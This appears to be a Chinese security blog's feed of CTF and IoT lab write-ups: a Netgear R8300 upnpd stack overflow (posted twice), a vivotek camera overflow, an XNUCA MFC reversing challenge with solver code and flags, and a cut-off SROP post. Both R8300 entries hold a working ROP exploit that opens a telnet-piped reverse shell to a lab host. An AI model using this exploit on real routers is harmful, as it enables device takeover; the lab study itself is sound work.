<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CTF reverse</title>
  
  <subtitle>llx-moon&#39;blogs</subtitle>
  <link href="http://yoursite.com/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-11-12T06:45:54.431Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>llx-moon</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/11/12/R8300/"/>
    <id>http://yoursite.com/2020/11/12/R8300/</id>
    <published>2020-11-12T03:24:41.152Z</published>
    <updated>2020-11-12T06:45:54.431Z</updated>
    
    <content type="html"><![CDATA[<p>继vivotek摄像头调试成功后，在IoT-vulnhub平台调试的第二个洞，这是一个由于strcpy导致栈溢出的洞，处理的数据是upnp服务接收的UDP数据包</p><p><img src="/2020/11/12/R8300/image-20201112105313699.png" alt="image-20201112105313699"></p><p><img src="/2020/11/12/R8300/image-20201112105352444.png" alt="image-20201112105352444"></p><p>从中可以看到upnp会为接收到的数据创造一个0x1FFFu的内存，这片内存空间的地址而进入到vuln函数后通过strcpy传递到栈上,而该漏洞函数的栈空间大小只有0x658，所以完全足够覆盖返回地址。</p><p>利用给的POC，可以得到覆盖后的地址显示为“CCCB”，确实覆盖了函数地址但仔细发现POC构造的数据为“CCCC”，传递过去后会莫名奇妙的减1，通过查询资料可以了解到在arm架构中有两种模式arm和thumb模式，这两种模式可以同时存在于程序中，其中arm模式的指令为四字节，thumb模式指令为两字节，两种模式转换要通过bx指令，当bx指向的内容最低位为1表示thumb，为0表示arm。当程序出现异常时会转换成arm模式也就是会将最低位置0，所以将构造的payload设置位“BBBB”，返回地址显示的也是“BBBB”。</p><p>由于只给了POC脚本，根据网上查阅的信息该类设备通常开了ASLR，所以要利用堆栈重用攻击构造ROP链，可以参考<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/%EF%BC%8C%E6%88%91%E5%9C%A8%E8%B0%83%E8%AF%95%E5%B0%B1%E6%8A%8AASLR%E5%85%B3%E4%BA%86%EF%BC%8C%E7%A8%8D%E5%BE%AE%E7%AE%80%E5%8D%95%E7%82%B9%E3%80%82">https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/，我在调试就把ASLR关了，稍微简单点。</a></p><p>在构造payload过程中要注意v51是一个指针型变量，所以它指向的空间必须是存在的，因此要赋给它一个存在的地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">libc_base&#x3D;0x76dd0000</span><br><span class="line">stack_base&#x3D;0x7effdb8c</span><br><span class="line">p32 &#x3D; lambda x: struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload &#x3D; (</span><br><span class="line">    0x604 * b&#39;a&#39; +  # dummy</span><br><span class="line">    p32(0x7effa53c) +  # v41</span><br><span class="line">    (0x634 - 0x604 - 8) * b&#39;a&#39; +  # dummy</span><br><span class="line">    p32(0x76e0db80) +     #pop &#123;r0,pc&#125;</span><br><span class="line">    p32(0x7effdbcc) +    #stack_base+0x40指向命令地址</span><br><span class="line">    p32(0x76e2a270) + #&amp;system</span><br><span class="line">    b&quot;pwd;&quot;*80+b&quot;telnet 192.168.2.1 8080 | &#x2F;bin&#x2F;sh | telnet 192.168.2.1 1080&quot;  # pwd;*80用作缓冲</span><br><span class="line">)</span><br><span class="line">s.connect((&#39;192.168.2.2&#39;, 1900))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.recvfrom(1024)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>由于靶机上没有nc命令但有telnet命令，因此尝试用telnet反弹shell，主机上开两个窗口</p><p>分别监听1080和8080端口，一个窗口用作命令执行，一个窗口用作回显</p><p><img src="/2020/11/12/R8300/image-20201112144508723.png" alt="image-20201112144508723"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;继vivotek摄像头调试成功后，在IoT-vulnhub平台调试的第二个洞，这是一个由于strcpy导致栈溢出的洞，处理的数据是upnp服务接收的UDP数据包&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/11/12/R8300/image-202011121053136</summary>
      
    
    
    
    
    <category term="over-flow" scheme="http://yoursite.com/tags/over-flow/"/>
    
    <category term="upnp" scheme="http://yoursite.com/tags/upnp/"/>
    
    <category term="darm" scheme="http://yoursite.com/tags/darm/"/>
    
  </entry>
  
  <entry>
    <title>IoT-vulnhub:Netgear-R8300</title>
    <link href="http://yoursite.com/2020/11/12/IoT-vulnhub-Netgear-R8300/"/>
    <id>http://yoursite.com/2020/11/12/IoT-vulnhub-Netgear-R8300/</id>
    <published>2020-11-12T02:25:44.807Z</published>
    <updated>2020-11-12T06:48:04.374Z</updated>
    
    <content type="html"><![CDATA[<p>继vivotek摄像头调试成功后，在IoT-vulnhub平台调试的第二个洞，这是一个由于strcpy导致栈溢出的洞，处理的数据是upnp服务接收的UDP数据包</p><p><img src="/2020/11/12/IoT-vulnhub-Netgear-R8300/image-20201112105313699.png" alt="image-20201112105313699"></p><p><img src="/2020/11/12/IoT-vulnhub-Netgear-R8300/image-20201112105352444.png" alt="image-20201112105352444"></p><p>从中可以看到upnp会为接收到的数据创造一个0x1FFFu的内存，这片内存空间的地址而进入到vuln函数后通过strcpy传递到栈上,而该漏洞函数的栈空间大小只有0x658，所以完全足够覆盖返回地址。</p><p>利用给的POC，可以得到覆盖后的地址显示为“CCCB”，确实覆盖了函数地址但仔细发现POC构造的数据为“CCCC”，传递过去后会莫名奇妙的减1，通过查询资料可以了解到在arm架构中有两种模式arm和thumb模式，这两种模式可以同时存在于程序中，其中arm模式的指令为四字节，thumb模式指令为两字节，两种模式转换要通过bx指令，当bx指向的内容最低位为1表示thumb，为0表示arm。当程序出现异常时会转换成arm模式也就是会将最低位置0，所以将构造的payload设置位“BBBB”，返回地址显示的也是“BBBB”。</p><p>由于只给了POC脚本，根据网上查阅的信息该类设备通常开了ASLR，所以要利用堆栈重用攻击构造ROP链，可以参考<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/%EF%BC%8C%E6%88%91%E5%9C%A8%E8%B0%83%E8%AF%95%E5%B0%B1%E6%8A%8AASLR%E5%85%B3%E4%BA%86%EF%BC%8C%E7%A8%8D%E5%BE%AE%E7%AE%80%E5%8D%95%E7%82%B9%E3%80%82">https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/，我在调试就把ASLR关了，稍微简单点。</a></p><p>在构造payload过程中要注意v51是一个指针型变量，所以它指向的空间必须是存在的，因此要赋给它一个存在的地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">libc_base&#x3D;0x76dd0000</span><br><span class="line">stack_base&#x3D;0x7effdb8c</span><br><span class="line">p32 &#x3D; lambda x: struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload &#x3D; (</span><br><span class="line">    0x604 * b&#39;a&#39; +  # dummy</span><br><span class="line">    p32(0x7effa53c) +  # v41</span><br><span class="line">    (0x634 - 0x604 - 8) * b&#39;a&#39; +  # dummy</span><br><span class="line">    p32(0x76e0db80) +     #pop &#123;r0,pc&#125;</span><br><span class="line">    p32(0x7effdbcc) +    #stack_base+0x40指向命令地址</span><br><span class="line">    p32(0x76e2a270) + #&amp;system</span><br><span class="line">    b&quot;pwd;&quot;*80+b&quot;telnet 192.168.2.1 8080 | &#x2F;bin&#x2F;sh | telnet 192.168.2.1 1080&quot;  # pwd;*80用作缓冲</span><br><span class="line">)</span><br><span class="line">s.connect((&#39;192.168.2.2&#39;, 1900))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.recvfrom(1024)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>由于靶机上没有nc命令但有telnet命令，因此尝试用telnet反弹shell，主机上开两个窗口</p><p>分别监听1080和8080端口，一个窗口用作命令执行，一个窗口用作回显</p><p><img src="/2020/11/12/IoT-vulnhub-Netgear-R8300/image-20201112144508723.png" alt="image-20201112144508723"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;继vivotek摄像头调试成功后，在IoT-vulnhub平台调试的第二个洞，这是一个由于strcpy导致栈溢出的洞，处理的数据是upnp服务接收的UDP数据包&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/11/12/IoT-vulnhub-Netgear-R8300/i</summary>
      
    
    
    
    
    <category term="over-flow" scheme="http://yoursite.com/tags/over-flow/"/>
    
    <category term="upnp" scheme="http://yoursite.com/tags/upnp/"/>
    
    <category term="darm" scheme="http://yoursite.com/tags/darm/"/>
    
  </entry>
  
  <entry>
    <title>UnravelMFC</title>
    <link href="http://yoursite.com/2020/11/03/UnravelMFC/"/>
    <id>http://yoursite.com/2020/11/03/UnravelMFC/</id>
    <published>2020-11-03T07:39:05.123Z</published>
    <updated>2020-11-03T08:40:18.242Z</updated>
    
    <content type="html"><![CDATA[<p>XNUCA实在是太难了，连这个XNUCA做出来人数最多的一题我都做了接近两天才弄出来，还是太菜了。</p><p>本题是一个MFC题有输入框但无论你怎么输入，始终无法点击那个确认按钮，我也是醉了这个地方，后面就在import表中找到GetWindowTextW，GetDlgItemTextW函数下断但始终没断下来，后面于是换了个思路用xspy工具扫它找到它几个button所对应的函数，然后下断。</p><p><img src="/2020/11/03/UnravelMFC/image-20201103154713519.png" alt="image-20201103154713519"></p><p>定位了三个函数，其中断在了sub_5A13A0这个函数，终于发现里面有个判断长度的地方</p><p><img src="/2020/11/03/UnravelMFC/image-20201103154956457.png" alt="image-20201103154956457"></p><p>但恶心的是你的输入框最多只允许你输入0x3f长度，所以不管你怎么输入都过不了这个判断。这也难怪窗体上那个确认键无法触发了，将这个判断patch掉，就能顺利来到了sub_5A1080这个函数，前面一大串都是些无用的函数，直到这个判断</p><p><img src="/2020/11/03/UnravelMFC/image-20201103160415658.png" alt="image-20201103160415658"></p><p>里面有一个很奇怪的字符，进去看了以下就是flag正确，以UTF-16LE的格式存储的，难怪string不出来</p><p><img src="/2020/11/03/UnravelMFC/image-20201103160556235.png" alt="image-20201103160556235"></p><p>到这里基本上就能确定关键函数的位置了，第一个判断函数是做了一个RC4加密，把亦或的key dump出来就行，然后又做了个魔改base64（函数好像做了控制流平坦化，这个要调试才能看出来）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">key&#x3D;[0x40,0x28,0xb6,0x5c,0xd3,0x84,0x5c,0x1a,0xe0,0x18,0xfd,0x3f,0x5d,0xce,0xf6,0xbb,0x3d,0x46,0x43,0x82,0x7a,0xa9,0x5c,0xe3,0xe4,0x48,0xfd,0xa5,0xb9,0x39,0x7b,0xd4,0xfe,0xfe]</span><br><span class="line">#input[:0x1b]^key</span><br><span class="line">#base64encode()</span><br><span class="line">from z3 import *</span><br><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line">print(len(key))</span><br><span class="line">str1 &#x3D; &quot;$HM%&#x2F;NEX,79PBN\C&#x2F;BQLVSW,*&#x2F;&#39;8T#UMC4%EG@@@,.%5&quot;</span><br><span class="line"></span><br><span class="line">string1 &#x3D; &quot;#$%&amp;&#39;()*+,-.&#x2F;0123456789:;&lt;&#x3D;&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_&#96;ab&quot;</span><br><span class="line">string2 &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;</span><br><span class="line">tmp&#x3D;base64.b64decode(str1.translate(str.maketrans(string1,string2)))</span><br><span class="line">print(len(tmp))</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(0x21):</span><br><span class="line">    flag+&#x3D;chr(tmp[i]^key[i])</span><br><span class="line">print (flag)</span><br><span class="line">#Fr4nk1y_MfC_l5_t0O_ComPIeX_4nd_dl</span><br></pre></td></tr></table></figure><p>这就是前半段的解，第二个函数先是判断你的第二段的首字符是不是“f”，然后将你的输入做了一个DWORD小端转换，之后就是做了一个魔改的TEA加密但这个加密只改了delta，其它像运算过程是没改的，后面就到了比较部分了，这又是一个坑人的地方。它将最后的生成的密文分成4段64位，res[0]，res[1]，res[2]，res[3]，其中res[1]==0xDF3634AE2F9970FF。</p><p><img src="/2020/11/03/UnravelMFC/image-20201103162005697.png" alt="image-20201103162005697"></p><p>然后下一步判断是一个加减法运算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(res[2]-res[0]&#x3D;&#x3D;0x3F66B755B4490579)</span><br><span class="line">(res[3]+res[0]&#x3D;&#x3D;0x1162F924623D2CAE0)</span><br><span class="line">(res[3]-res[2]&#x3D;&#x3D;0x7C3C71F1B295D77F)</span><br></pre></td></tr></table></figure><p><img src="/2020/11/03/UnravelMFC/image-20201103162842110.png" alt="image-20201103162842110"></p><p>从判断函数上看res[3]+res[0]==0x162F924623D2CAE0，但后面通过这个解出来的值再做TEA解密有不可见字符，经过其他的师傅提醒才发现这里会有一个溢出，所以进一位尝试发现这样才有可行解，最终解出来是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">s&#x3D;Solver()</span><br><span class="line">x&#x3D;Int(&#39;x&#39;)</span><br><span class="line">y&#x3D;Int(&#39;y&#39;)</span><br><span class="line">z&#x3D;Int(&#39;z&#39;)</span><br><span class="line">s.add(y-x&#x3D;&#x3D;0x3F66B755B4490579)</span><br><span class="line">s.add(z+x&#x3D;&#x3D;0x1162F924623D2CAE0)</span><br><span class="line">s.add(z-y&#x3D;&#x3D;0x7C3C71F1B295D77F)</span><br><span class="line">print s.check()</span><br><span class="line">print s.model()</span><br><span class="line">key1&#x3D;[0xD9610D02, 0x2AADA57D, 0xA37537F1, 0xC29E3913]</span><br><span class="line">key2&#x3D;[0xD5942CE8, 0x608CCE66, 0x6D593422, 0x21E5D6F2]</span><br><span class="line">key3&#x3D;[0xED3A9235, 0x9DAD62C4, 0x3856641B, 0x71F75B9D]</span><br><span class="line">key4&#x3D;[0xDCDEDAE8, 0xEAD2D1A0, 0xBAC4F564, 0xDA4772AC]</span><br><span class="line">res1: 0x2D46347F  0x5E79F6F4</span><br><span class="line"></span><br><span class="line">res2: 0xDF3634AE  0x2F9970FF  </span><br><span class="line"></span><br><span class="line">res3: 0x6CACEBD5  0x12C2FC6D</span><br><span class="line"></span><br><span class="line">res4: 0xe8E95DC6  0xC558D3EC</span><br></pre></td></tr></table></figure><p>再用魔改TEA解密出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;stdint.h&gt;  </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;加密函数  </span><br><span class="line">void encrypt(uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0 &#x3D; v[0], v1 &#x3D; v[1], sum &#x3D; 0, i;           &#x2F;* set up *&#x2F;</span><br><span class="line">    uint32_t delta &#x3D; 0x9e3779b9;                     &#x2F;* a key schedule constant *&#x2F;</span><br><span class="line">    uint32_t k0 &#x3D; k[0], k1 &#x3D; k[1], k2 &#x3D; k[2], k3 &#x3D; k[3];   &#x2F;* cache key *&#x2F;</span><br><span class="line">    for (i &#x3D; 0; i &lt; 32; i++) &#123;                       &#x2F;* basic cycle start *&#x2F;</span><br><span class="line">        sum +&#x3D; delta;</span><br><span class="line">        v0 +&#x3D; ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);</span><br><span class="line">        v1 +&#x3D; ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);</span><br><span class="line">    &#125;                                              &#x2F;* end cycle *&#x2F;</span><br><span class="line">    v[0] &#x3D; v0; v[1] &#x3D; v1;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;解密函数  </span><br><span class="line">void decrypt(uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0 &#x3D; v[0], v1 &#x3D; v[1], sum &#x3D; 0x2433B95A&lt;&lt;5, i;  &#x2F;* set up *&#x2F;</span><br><span class="line">    uint32_t delta &#x3D; 0x2433B95A;                     &#x2F;* a key schedule constant *&#x2F;</span><br><span class="line">    uint32_t k0 &#x3D; k[0], k1 &#x3D; k[1], k2 &#x3D; k[2], k3 &#x3D; k[3];   &#x2F;* cache key *&#x2F;</span><br><span class="line">    for (i &#x3D; 0; i&lt;32; i++) &#123;                         &#x2F;* basic cycle start *&#x2F;</span><br><span class="line">        v1 -&#x3D; ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);</span><br><span class="line">        v0 -&#x3D; ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);</span><br><span class="line">        sum -&#x3D; delta;</span><br><span class="line">    &#125;                                              &#x2F;* end cycle *&#x2F;</span><br><span class="line">    v[0] &#x3D; v0; v[1] &#x3D; v1;</span><br><span class="line">&#125;</span><br><span class="line">void get_byte(uint32_t t)</span><br><span class="line">&#123;</span><br><span class="line">    char tmp[4];</span><br><span class="line">    int i;</span><br><span class="line">    for (i &#x3D; 0; i &lt; 4; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp[i] &#x3D; (t &gt;&gt; (8 * i)) &amp; 0xff;</span><br><span class="line">    &#125;</span><br><span class="line">    for (i &#x3D; 0; i &lt; 4; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;, tmp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[8] &#x3D; &#123; 0x2D46347F,0x5E79F6F4,0xDF3634AE,0x2F9970FF,0x6CACEBD5,0x12C2FC6D,0xe8E95DC6,0xC558D3EC &#125;, k[16] &#x3D; &#123; 0xD9610D02, 0x2AADA57D, 0xA37537F1, 0xC29E3913, 0xD5942CE8, 0x608CCE66, 0x6D593422, 0x21E5D6F2,0xED3A9235, 0x9DAD62C4, 0x3856641B, 0x71F75B9D,0xDCDEDAE8, 0xEAD2D1A0, 0xBAC4F564, 0xDA4772AC &#125;;</span><br><span class="line">    int i;</span><br><span class="line">    for (i &#x3D; 0; i &lt; 4; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt(&amp;v[2 * i], &amp;k[4 * i]);</span><br><span class="line">        printf(&quot;解密后的数据：%x %x\n&quot;, v[2*i], v[2*i+1]);</span><br><span class="line">    &#125;</span><br><span class="line">    for (i &#x3D; 0; i &lt; 8; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        get_byte(v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">#f1cUlt_foR_THe_r0Ok1E_t0_REver5e</span><br></pre></td></tr></table></figure><p>拼在一起就是</p><p>Fr4nk1y_MfC_l5_t0O_ComPIeX_4nd_dlff1cUlt_foR_THe_r0Ok1E_t0_REver5e</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;XNUCA实在是太难了，连这个XNUCA做出来人数最多的一题我都做了接近两天才弄出来，还是太菜了。&lt;/p&gt;
&lt;p&gt;本题是一个MFC题有输入框但无论你怎么输入，始终无法点击那个确认按钮，我也是醉了这个地方，后面就在import表中找到GetWindowTextW，GetDlg</summary>
      
    
    
    
    <category term="windows-reverse" scheme="http://yoursite.com/categories/windows-reverse/"/>
    
    
    <category term="TEA" scheme="http://yoursite.com/tags/TEA/"/>
    
    <category term="魔改base64" scheme="http://yoursite.com/tags/%E9%AD%94%E6%94%B9base64/"/>
    
  </entry>
  
  <entry>
    <title>IoT-vulnhub:vivotek</title>
    <link href="http://yoursite.com/2020/10/28/IoT-vulnhub-vivotek/"/>
    <id>http://yoursite.com/2020/10/28/IoT-vulnhub-vivotek/</id>
    <published>2020-10-28T08:34:25.501Z</published>
    <updated>2020-11-05T06:34:58.101Z</updated>
    
    <content type="html"><![CDATA[<p>之前一直在为IOT设备调试环境而烦恼，总是因为环境启动不起来导致放弃调试，也是偶然间在github上发现了这个IoT-vulnhub项目，这是个基于dockers搭好的环境，里面已经将环境布置好了，直接docker build一下就能用，但由于dockerhub的原因，把博主之前搭好的环境都从hub上删掉了，但还好dockerfile都有直接本地build不从dockerhub上pull就行，整个步骤稍微和博主之前说的有些不同，首先得基于ubuntu16.04构建一个基础镜像，其他的镜像像binwalk、qemu、firmdyne都是基于这个镜像做的一个升级，所以直接改dockerfile的文件头部名称from 接上你构建的ubuntu16.04的容器名称就行，然后如果觉得有些配置需要装上的，也可以直接在dockerfile里面修改，我就稍微改了下qemu-system的dockerfile安装了一个pwndbg。</p><p>后面就如漏洞调试环节了，这是一个摄像头的缓冲区溢出漏洞，是一个2017的漏洞，网上到处都是解析，所以我就不详细分析了，大概讲一下，主要还是讲述怎么依据这个平台调试这个漏洞。按照博主的介绍要通过qemu-system调试这个漏洞按照下面三条命令就能顺利进入你的环境了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -f docker-compose-system.yml build</span><br><span class="line">docker-compose -f docker-compose-system.yml up</span><br><span class="line">docker exec -it vivotek-system &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>这个环境的优势在于利用docker的优势不需要在网络配置上下很多的功夫，你的测试机是能和你的物理机相通并且开放了ssh连接，你的靶机也是和你的测试机处在一个内网段上，通过ssh也能连接上，传输什么的就很方便，进入到测试机上可以看见什么pwntools还有gdb什么的都有，就是一个能做pwn题的ubuntu16的虚拟机，通过scp命令将gdbserver传递到靶机，开放端口附加到httpd的进程就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;arm-gdbserver :port --attach PID</span><br></pre></td></tr></table></figure><p>然后测试机上用gdb-multiarch squashfs-root/usr/sbin/httpd -q启动调试，进入到pwndbg下还有输入下面两条命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set sysroot 固件的目录 &#x2F;用于加载符号表</span><br><span class="line">target remote ip:port</span><br></pre></td></tr></table></figure><p>这样就已经附加上靶机上的进程了，这时候通过tools目录下给的poc.sh进行测试。</p><p><img src="/2020/10/28/IoT-vulnhub-vivotek/image-20201104230229346.png" alt="image-20201104230229346"></p><p><img src="/2020/10/28/IoT-vulnhub-vivotek/image-20201104231320489.png" alt="image-20201104231320489"></p><p>可以看到此时的PC为构造好的输入XXXX，说明成功触发了漏洞，再看下libc的地址。</p><p><img src="/2020/10/28/IoT-vulnhub-vivotek/image-20201104232522359.png" alt="image-20201104232522359"></p><p>和exp的一样，后续的话就在尝试用exp拿shell了，但在这之前由于poc.sh导致httpd服务宕机，所以还需要在靶机上重启该服务，命令为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chroot squashfs-root&#x2F; sh</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;httpd</span><br></pre></td></tr></table></figure><p>由于测试机上装的是python3的pwntools，由于python3对字节流和字符串有着明显的划分，所以脚本会报错，所以得将里面的字符串用bytes(str,encoding=’utf-8’)做一个转换，然后将payload输出到一个exp.sh的shell文件，按道理来说直接执行这个shell就能达到目的了，但还是因为python3对字节流和字符串的处理导致最后的payload的格式是b’str’把b、’‘这些标识符也读进去了，因此还得用python2的pwntools直接物理机执行exp.py生成exp.sh就能成功获取shell了。</p><p><img src="/2020/10/28/IoT-vulnhub-vivotek/image-20201105143443954.png" alt="image-20201105143443954"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前一直在为IOT设备调试环境而烦恼，总是因为环境启动不起来导致放弃调试，也是偶然间在github上发现了这个IoT-vulnhub项目，这是个基于dockers搭好的环境，里面已经将环境布置好了，直接docker build一下就能用，但由于dockerhub的原因，把博</summary>
      
    
    
    
    
    <category term="over-flow" scheme="http://yoursite.com/tags/over-flow/"/>
    
    <category term="httpd" scheme="http://yoursite.com/tags/httpd/"/>
    
    <category term="docker" scheme="http://yoursite.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>flow</title>
    <link href="http://yoursite.com/2020/10/19/flow/"/>
    <id>http://yoursite.com/2020/10/19/flow/</id>
    <published>2020-10-19T12:15:53.313Z</published>
    <updated>2020-10-20T00:37:05.322Z</updated>
    
    <content type="html"><![CDATA[<p>这道题感觉都被人做烂了，我也是赛后才做出来，实在是太菜了。</p><p>简单说说这题吧，流程其实就是一个RC4和一个魔改TEA加密，RC4可以通过对IDA中未定义的函数段重新定义后就能看出来。</p><p><img src="/2020/10/19/flow/image-20201019235640204.png" alt="image-20201019235640204"></p><p>TEA的话可以通过findcrypt看出特征值，但魔改的话还得看调试看出来，写这道题的目的还是想了解下SROP技术，帖子的话可以参考这个链接<a href="https://www.freebuf.com/articles/network/87447.html">https://www.freebuf.com/articles/network/87447.html</a></p><p>我的话就根据这个链接讲解下本题是如何利用这项技术的，首先看到IDA未定义的函数末尾都有一个</p><p><img src="/2020/10/19/flow/image-20201020075740296.png" alt="image-20201020075740296"></p><p>syscall系统调用，这是触发<code>sigreturn</code>系统调用的关键代码，执行这段代码将内核为该进程恢复之前保存的上下文，最后恢复进程的执行，而之前的上下文数据都会保存在栈上。</p><p><img src="/2020/10/19/flow/14487175105930.png!small" alt="img"></p><p>在程序读取输入之后，先会做一个ascii转16进制，然后通过构造数据利用memcpy造成栈溢出，在溢出函数最后返回时看下栈上的数据。rt_sigreturn是Signal Frame段的起始位置</p><p><img src="/2020/10/19/flow/image-20201020081142406.png" alt="image-20201020081142406"></p><p>能造成SROP的原理就攻击者可以篡改进程恢复之前保存的上下文数据，伪造恢复之后的状态，在本题中执行syscall后，返回之后的状态就是根据Signal Frame的数据完成的。</p><p><img src="/2020/10/19/flow/image-20201020083124211.png" alt="image-20201020083124211"></p><p>可以看到ip，sp，bp等寄存器都对应Signal 